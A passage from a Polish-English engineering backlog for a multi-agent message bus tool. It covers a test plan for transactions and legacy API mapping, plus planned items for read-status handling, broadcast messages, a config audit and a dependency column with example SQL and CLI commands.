### Test Suite 4: AgentBus Transaction Isolation

**test_transaction_rollback_on_error:**
- Start transaction
- Zapisz message (success)
- Zapisz invalid suggestion (trigger error)
- Rollback
- Assert: message NIE zapisany (atomowość)
- **Cel:** Verify transaction support

**test_transaction_commit_on_success:**
- Start transaction
- Zapisz message + suggestion
- Commit
- Assert: oba zapisane
- **Cel:** Verify transaction atomicity

### Test Suite 5: Legacy API Backward Compatibility

**test_legacy_message_type_mapping:**
- Send message z `type="flag_human"` (legacy)
- Read message przez repository
- Assert: message.type = MessageType.ESCALATION (canonical)
- **Cel:** Verify LegacyAPIMapper

**test_legacy_suggestion_status_mapping:**
- Add suggestion z `status="in_backlog"` (legacy)
- Read suggestion przez repository
- Assert: suggestion.status = SuggestionStatus.DEFERRED (canonical)
- **Cel:** Verify backward compat

## Success Criteria

- ✓ 15+ testów boundary dodanych
- ✓ Każda granica (Runner↔Repo, Live↔Replay, Hook↔Bash, Transaction, Legacy) pokryta
- ✓ Wszystkie testy FAIL przed fixami (wykrywają problemy)
- ✓ Wszystkie testy PASS po fixach (weryfikują rozwiązania)

## Dependencies

**Wymagane przed:**
- Fix Problem 1 (claimed leak) — testy FAIL przed, PASS po
- Fix Problem 2 (telemetry dedup) — testy FAIL przed, PASS po
- Fix Problem 3 (safety hardening) — testy FAIL przed, PASS po

**Umożliwia:**
- Safe refactor Problem 4 (AgentBus) — testy jako safety net

## Value

**Wysoka** — foundation dla wszystkich innych fixów. Bez testów nie wiemy czy fix działa.

## Effort

**Średnia** (~3-5 dni)
- 15 testów @ ~2-3 godziny per test suite
- Setup fixtures, mocks, assertions

## References

- Assessment: `documents/human/reports/agent_tools_mid_level_assessment_2026_03_24.md`
- Section: "Dlaczego to jeszcze nie jest senior" → punkt 6 (linie 210-226)

### [143] Agent_bus — auto mark-read + manual unread
**area:** Dev  **value:** srednia  **effort:** srednia  **status:** planned  **created_at:** 2026-03-24

Agent_bus — auto mark-read przy odpowiedzi + manual unread capability.

**Problem:**
Agenci nie markują wiadomości jako read nawet gdy odpowiadają. Przeładowuje context window w kolejnych sesjach.

**Now we have message titles:**
Można markować jako read gdy agent podniósł wiadomość (content), nie tylko tytuł.

**Task:**

1. **Auto mark-read przy odpowiedzi:**
   - Gdy agent wywołuje `send` w odpowiedzi na message X → auto mark X as read
   - Detection: `--ref <message_id>` parameter?
   - Behavior: atomically send + mark-read parent

2. **Manual mark-read/unread:**
   - `mark-read --id <msg_id>` (już istnieje?)
   - `mark-unread --id <msg_id>` (nowe)
   - Use case: Agent przeczytał, ale chce wrócić później

3. **Inbox filtering enhancement:**
   - `inbox --status unread` (już istnieje)
   - `inbox --status read` (nowe)
   - `inbox --status all` (nowe)

**Success criteria:**
- Auto mark-read działa
- Manual mark-unread dostępne
- Inbox filtering po statusie
- Test: Agent odpowiada → następna sesja nie pokazuje jako unread

**Source:** Sugestia #220

### [141] Agent communication — broadcast messages (do wszystkich)
**area:** Dev  **value:** srednia  **effort:** mala  **status:** planned  **created_at:** 2026-03-24

Agent communication — możliwość broadcast messages (wysyłanie do wszystkich ról naraz).

**Problem:**
PE notyfikuje wszystkie role o zmianach promptów — brak mechanizmu broadcast (musi wysyłać do każdej roli ręcznie).

**Task dla Developer:**
1. Sprawdzić czy możliwe `agent_bus_cli.py send --to all`?
2. Jeśli nie → implementacja:
   - `send --to all --content-file tmp/x.md`
   - Creates N messages (one per role) atomically
   - Exclude: sender nie dostaje swojej własnej wiadomości

**Task dla PE (po wdrożeniu):**
Dodaj do end_of_turn_checklist:
"Jeśli modyfikowałem prompty ról — wysłałem notyfikację broadcast?"

**Success criteria:**
- `send --to all` działa (lub backlog item)
- PE checklist zawiera broadcast notification reminder
- Test: PE zmienia 3 prompty → broadcast → 3 role dostają notification

**Source:** Sugestia #234

### [139] Architect audit — config-driven architecture w całym projekcie
**area:** Arch  **value:** wysoka  **effort:** srednia  **status:** planned  **created_at:** 2026-03-24

Architect wykonuje audit całego projektu pod kątem hardcoded values do przeniesienia do config.

**Z session_init:**
Przed: 6 promptów z hardcoded limitami
Po: 1 plik JSON config kontroluje wszystkie role

**Task:**
Architect audytuje:
1. Prompty (documents/*/*.md) — limity, ścieżki, parametry
2. Narzędzia (tools/*.py) — ścieżki, prompty, konfiguracja
3. Workflow (workflows/*.md) — parametry, thresholdy

**Deliverable:**
- Raport: lista hardcoded values do przeniesienia
- Propozycja architektury: gdzie trzymać configs
- Plan implementacji: priorytetyzacja

**Success criteria:**
- Raport w documents/human/reports/config_driven_audit_YYYY_MM_DD.md
- Architect wysyła propozycję do PE i Developer
- Backlog items dla top priorities

**Source:** Sugestia #241

### [124] Dependency support w backlogu (depends_on kolumna)
**area:** Dev  **value:** srednia  **effort:** srednia  **status:** planned  **created_at:** 2026-03-23

# Backlog Dev: Dependency support w backlogu

## Problem

Backlog items nie mają kolumny `depends_on` — nie można oznaczyć że task X zależy od task Y.

**Przykład:**
- #119 (PE — sprawdzanie logów w session_start) zależy od #122 (Dev — session-logs tool)
- Obecnie: dependency tylko w `content` (prose) — nie jest machine-readable

## Scope

### 1. Schema migration

Dodaj kolumnę `depends_on` do `backlog`:
```sql
ALTER TABLE backlog ADD COLUMN depends_on INTEGER REFERENCES backlog(id);
```

Domyślnie NULL (backward compatible).

### 2. CLI support

**backlog-add:**
```bash
py tools/agent_bus_cli.py backlog-add --title "..." --area Dev --depends-on 122 --content-file tmp/x.md
```

**backlog-update:**
```bash
py tools/agent_bus_cli.py backlog-update --id 119 --depends-on 122
```

**backlog (read):**
```json
{
  "id": 119,
  "title": "...",
  "depends_on": 122,
  "status": "planned"
}
```

### 3. Validation (opcjonalnie)

Gdy agent próbuje ustawić status `in_progress` na task który ma dependency:
- Sprawdź czy `depends_on` task ma status `done`
- Jeśli nie → warning (nie blokuj, ale zasygnalizuj)

## Expected outcome

1. Agent może oznaczyć dependency: `--depends-on <id>`
2. Backlog pokazuje zależności (machine-readable)
3. Opcjonalnie: validation przed rozpoczęciem pracy

## Priorytet

Średni — quality of life improvement, nie bloker.

## Area

Dev (narzędzia)

## Effort

Średnia (schema migration + CLI + opcjonalna validation)
